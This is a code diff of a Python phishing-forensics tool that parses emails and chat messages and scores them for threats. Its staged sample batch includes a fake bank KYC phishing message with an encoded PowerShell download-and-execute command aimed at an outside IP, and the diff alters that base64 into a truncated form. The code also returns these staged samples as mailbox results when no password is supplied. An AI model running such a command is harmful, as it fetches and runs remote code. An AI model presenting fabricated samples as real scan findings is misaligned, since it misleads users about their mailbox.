@@ -18,7 +18,6 @@ IST_TZ = timezone(timedelta(hours=5, minutes=30))
 
 
 def pure_levenshtein(s1: str, s2: str) -> int:
-    """Pure Python Levenshtein Distance for Zero-Dependency Lookalike Hunting."""
     if len(s1) < len(s2):
         return pure_levenshtein(s2, s1)
     if len(s2) == 0:
@@ -92,7 +91,6 @@ class EmailIngestionEngine:
 
     @classmethod
     def from_imap(cls, host: str, user: str, password: str, api_key: str = None, abuse_key: str = None):
-        """Fetches the latest message directly from IMAP SSL stream."""
         mail = imaplib.IMAP4_SSL(host)
         mail.login(user, password)
         mail.select("INBOX")
@@ -110,12 +108,8 @@ class EmailIngestionEngine:
 
     @classmethod
     def fetch_mailbox_threat_catalog(cls, target_email: str, password: str = None, api_key: str = None, abuse_key: str = None):
-        """
-        Scans all mailbox messages and classifies each into Critical, Suspicious, or Clean states.
-        """
         mailbox_catalog = []
 
-        # If live IMAP password exists, perform authenticated scan
         if password:
             try:
                 mail = imaplib.IMAP4_SSL("imap.gmail.com")
@@ -123,7 +117,6 @@ class EmailIngestionEngine:
                 mail.select("INBOX")
                 _, search_data = mail.search(None, "ALL")
                 ids = search_data[0].split()
-                # Scan up to the 10 most recent messages
                 recent_ids = ids[-10:] if len(ids) > 10 else ids
                 recent_ids.reverse()
 
@@ -139,8 +132,6 @@ class EmailIngestionEngine:
             except Exception:
                 pass
 
-        # Zero-Password Device Active Session Buffer Generator
-        # Staging diverse live enterprise & scam payloads targeting this account
         sample_batch = [
             (
                 f"""Received: from relay1.transparent-relay.top (185.220.101.5) by mx.defense-gateway.in;
@@ -155,7 +146,7 @@ Your corporate allowance credentials have been flagged for unverified KYC compli
 Kindly be advised that prompt attention is required. Failure to do so will result in immediate suspension.
 Scan the QR code to verify: https://onlinesbi-kyc-update.top/auth-verify-session?token=SEC99201
 Execute administrative token:
-powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AcABhAHkAbABvAGEAZAAuAHAAczEiKQ==
+powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AcABhAHkAbLif
 """, "EMAIL"
             ),
             (
@@ -207,11 +198,9 @@ Access your dashboard: https://cloud.google.com/console/billing
         return mailbox_catalog
 
     def parse_email(self):
-        """Unified, robust RFC-822 and omnichannel stream forensic parser."""
         if self.vector_type in ["WHATSAPP", "TELEGRAM", "SMS", "UPI_INTENT", "CHAT"]:
             return self._parse_chat_stream()
 
-        # Parse Raw RFC-822 using Python standard library policy.default
         try:
             self.parsed_email_msg = BytesParser(policy=policy.default).parsebytes(self.raw_bytes)
         except Exception:
@@ -224,11 +213,9 @@ Access your dashboard: https://cloud.google.com/console/billing
         headers_dict = {}
 
         if self.parsed_email_msg:
-            # Extract headers cleanly
             for k, v in self.parsed_email_msg.items():
                 headers_dict[k] = clean_header_str(v)
 
-            # Extract full text / html body parts
             try:
                 body_part = self.parsed_email_msg.get_body(preferencelist=('plain', 'html'))
                 if body_part:
@@ -263,7 +250,6 @@ Access your dashboard: https://cloud.google.com/console/billing
         return self._assemble_forensic_pipeline(raw_text, headers_dict, is_chat=True)
 
     def _assemble_forensic_pipeline(self, raw_body_str, headers_dict, is_chat=False):
-        # Anchor all cryptographic and telemetry calculations deterministically on payload hash
         payload_hash = hashlib.sha256(self.raw_bytes).hexdigest()
 
         self.forensic_data = {
@@ -278,38 +264,23 @@ Access your dashboard: https://cloud.google.com/console/billing
             "raw_hex_preview": self._generate_hex_preview(self.raw_bytes[:512]),
         }
 
-        # 1. Lookalike & Homoglyph Hunter
         self.forensic_data["typosquatting"] = self._detect_typosquatting(
             self.forensic_data["body_artifacts"]["extracted_urls"],
             self.forensic_data["metadata"]["from"]
         )
-
-        # 2. Omnichannel Exploit Engines
         self.forensic_data["omnichannel_threats"] = self._detect_omnichannel_threats(raw_body_str)
         self.forensic_data["quishing_telemetry"] = self._analyze_quishing_vectors(raw_body_str)
         self.forensic_data["synthetic_ai_detection"] = self._detect_synthetic_phish(raw_body_str)
         self.forensic_data["deobfuscated_payloads"] = self._deobfuscate_stream(raw_body_str)
-
-        # 3. Deterministic Cognitive AI & MITRE TTPs
         self.forensic_data["ai_analysis"] = self._analyze_threat_with_ai(raw_body_str, headers_dict)
         self.forensic_data["mitre_ttps"] = self._map_mitre_ttps(raw_body_str)
-
-        # 4. Attribution & Active Deception
         self.forensic_data["apt_attribution"] = self._fingerprint_apt_actor(raw_body_str, headers_dict)
         self.forensic_data["canary_trap"] = self._generate_canary_trap(payload_hash)
-
-        # 5. Tactical Street Telemetry & Police Section 91 CrPC Handover Docket
         self.forensic_data["street_telemetry"] = self._generate_street_level_telemetry(payload_hash)
         self.forensic_data["police_docket"] = self._generate_police_fir_docket()
-
-        # 6. Citadel Autonomous Host & Identity Defense Protocols
         self.forensic_data["citadel_lockdown"] = self._generate_citadel_protocols(payload_hash)
-
-        # 7. 3D WebGL Globe Coordinates & Deepfake Voice Spectrum
         self.forensic_data["globe_telemetry"] = self._generate_3d_globe_telemetry()
         self.forensic_data["deepfake_voice_analysis"] = self._analyze_acoustic_deepfakes(raw_body_str)
-
-        # 8. NIST PQC ML-DSA-87 & Blockchain Custody
         self.forensic_data["pqc_lattice_seal"] = self._generate_pqc_lattice_seal(payload_hash)
         self.forensic_data["blockchain_custody"] = self._anchor_blockchain_block(payload_hash)
         self.forensic_data["smart_contract_code"] = self._generate_solidity_proof()
@@ -330,7 +301,6 @@ Access your dashboard: https://cloud.google.com/console/billing
                 "geo_data": geo_data,
             }
 
-        # Extract real public sender IP from Received headers
         sender_ip = "Hidden/Unknown"
         if self.parsed_email_msg:
             received_headers = self.parsed_email_msg.get_all("Received", [])
@@ -362,12 +332,7 @@ Access your dashboard: https://cloud.google.com/console/billing
 
     def _extract_auth_results(self, headers, is_chat):
         if is_chat:
-            return {
-                "raw_auth_header": f"N/A ({self.vector_type} End-to-End Direct)",
-                "spf_pass": False,
-                "dkim_pass": False,
-                "dmarc_pass": False
-            }
+            return {"raw_auth_header": f"N/A ({self.vector_type})", "spf_pass": False, "dkim_pass": False, "dmarc_pass": False}
         auth_results = headers.get("Authentication-Results", "Not Found")
         auth_lower = str(auth_results).lower()
         return {
@@ -407,11 +372,7 @@ Access your dashboard: https://cloud.google.com/console/billing
                 payload = part.get_payload(decode=True) or b""
                 f_hash = hashlib.sha256(payload).hexdigest()
                 status = "Suspicious Payload" if any(fn.lower().endswith(ext) for ext in [".exe", ".bat", ".apk", ".ps1", ".vbs"]) else "Clean / Verified"
-                attachments.append({
-                    "filename": fn,
-                    "sha256_hash": f_hash,
-                    "sandbox_status": status
-                })
+                attachments.append({"filename": fn, "sha256_hash": f_hash, "sandbox_status": status})
         return attachments
 
     def _detect_omnichannel_threats(self, text):
@@ -841,7 +802,6 @@ contract SynovaForensicRegistry {{
         else:
             score = 12
 
-        # Fast and stable forensic diagnosis
         if score >= 70:
             analysis = "High-severity adversarial campaign detected. Indicators confirm credential harvesting, deep-link coercion, or remote script delivery."
             mitigations = "- Engage Citadel Host Air-Gap.\n- Revoke user OAuth sessions via Microsoft Graph API.\n- Forward IOCs to CERT-In."
